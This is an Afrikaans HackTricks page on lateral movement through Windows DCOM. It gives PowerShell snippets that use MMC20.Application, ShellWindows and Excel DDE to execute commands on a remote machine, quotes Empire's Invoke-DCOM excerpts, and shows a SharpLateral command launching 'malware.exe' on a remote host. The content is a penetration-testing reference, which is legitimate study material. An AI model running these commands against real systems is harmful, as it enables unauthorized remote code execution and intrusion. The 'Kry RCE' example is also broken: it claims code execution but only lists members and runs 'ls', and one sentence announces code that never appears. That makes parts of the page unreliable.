# DCOM Uitvoer

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Werk jy in 'n **cybersekerheidsmaatskappy**? Wil jy jou **maatskappy geadverteer sien in HackTricks**? of wil jy toegang hê tot die **nuutste weergawe van die PEASS of HackTricks aflaai in PDF-formaat**? Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Ontdek [**Die PEASS-familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Sluit aan by die** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**hacktricks-opslag**](https://github.com/carlospolop/hacktricks) **en** [**hacktricks-cloud-opslag**](https://github.com/carlospolop/hacktricks-cloud)..

</details>

## MMC20.Application

**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike pos vanaf [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**


Verspreide Komponentobjekmodel (DCOM) objekte bied 'n interessante vermoë vir netwerkgebaseerde interaksies met objekte. Microsoft bied omvattende dokumentasie vir beide DCOM en Komponentobjekmodel (COM), toeganklik [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx). 'n Lys van DCOM-toepassings kan verkry word deur die PowerShell-opdrag:
```bash
Get-CimInstance Win32_DCOMApplication
```
Die COM-object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), maak skryf van MMC snap-in operasies moontlik. Merkwaardig genoeg bevat hierdie objek 'n `ExecuteShellCommand` metode onder `Document.ActiveView`. Meer inligting oor hierdie metode kan [hier](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx) gevind word. Kontroleer dit deur dit uit te voer:

Hierdie kenmerk fasiliteer die uitvoer van bevele oor 'n netwerk deur 'n DCOM-toepassing. Om vanaf 'n afstand met DCOM te kan interageer as 'n admin, kan PowerShell as volg gebruik word:
```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Hierdie bevel verbind met die DCOM-toepassing en gee 'n instansie van die COM-object terug. Die ExecuteShellCommand-metode kan dan aangeroep word om 'n proses op die afgeleë gasheer uit te voer. Die proses behels die volgende stappe:

Kyk na metodes:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Kry RCE:
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Vir meer inligting oor hierdie tegniek, kyk na die oorspronklike pos [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Die **MMC20.Application**-voorwerp is geïdentifiseer as 'n gebrek aan uitdruklike "LaunchPermissions," wat standaard na toestemmings wat Administrateurs toegang verleen, oorskakel. Vir verdere besonderhede kan 'n draad ondersoek word [hier](https://twitter.com/tiraniddo/status/817532039771525120), en die gebruik van [@tiraniddo](https://twitter.com/tiraniddo) se OleView .NET vir die filter van voorwerpe sonder uitdruklike Launch Permission word aanbeveel.

Twee spesifieke voorwerpe, `ShellBrowserWindow` en `ShellWindows`, is uitgelig weens hul gebrek aan uitdruklike Launch Permissions. Die afwesigheid van 'n `LaunchPermission`-registerinskrywing onder `HKCR:\AppID\{guid}` dui op geen uitdruklike toestemmings nie.

###  ShellWindows
Vir `ShellWindows`, wat 'n ProgID ontbreek, fasiliteer die .NET-metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` voorwerpinstansiasie deur sy AppID te gebruik. Hierdie proses maak gebruik van OleView .NET om die CLSID vir `ShellWindows` te herwin. Eenmaal geïnstantieer, is interaksie moontlik deur die `WindowsShell.Item`-metode, wat tot metode-aanroeping soos `Document.Application.ShellExecute` lei.

Voorbeeld PowerShell-opdragte is verskaf om die voorwerp te instansieer en op afstand opdragte uit te voer:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### Laterale Beweging met Excel DCOM-voorwerpe

Laterale beweging kan bereik word deur DCOM Excel-voorwerpe te benut. Vir gedetailleerde inligting, is dit raadsaam om die bespreking oor die benutting van Excel DDE vir laterale beweging via DCOM te lees by [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

Die Empire-projek bied 'n PowerShell-skripsie wat die gebruik van Excel vir afgeleë kode-uitvoering (RCE) demonstreer deur DCOM-voorwerpe te manipuleer. Hieronder is uittreksels uit die skripsie beskikbaar op [Empire se GitHub-opberging](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes toon om Excel vir RCE te misbruik:
```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Outomatiese Gereedskap vir Laterale Beweging

Twee gereedskappe word uitgelig vir die outomatiseering van hierdie tegnieke:

- **Invoke-DCOM.ps1**: 'n PowerShell-skrip wat deur die Empire-projek voorsien word en wat die aanroeping van verskillende metodes vir die uitvoering van kode op afgeleë rekenaars vereenvoudig. Hierdie skrip is toeganklik by die Empire GitHub-opgaarplek.

- **SharpLateral**: 'n gereedskap wat ontwerp is vir die afgeleë uitvoering van kode, wat gebruik kan word met die bevel:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Outomatiese Gereedskap

* Die Powershell-skrip [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) maak dit maklik om alle uitgekommentariseerde maniere om kode op ander rekenaars uit te voer, aan te roep.
* Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## Verwysings

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kontroleer die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFT's**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag. 

</details>
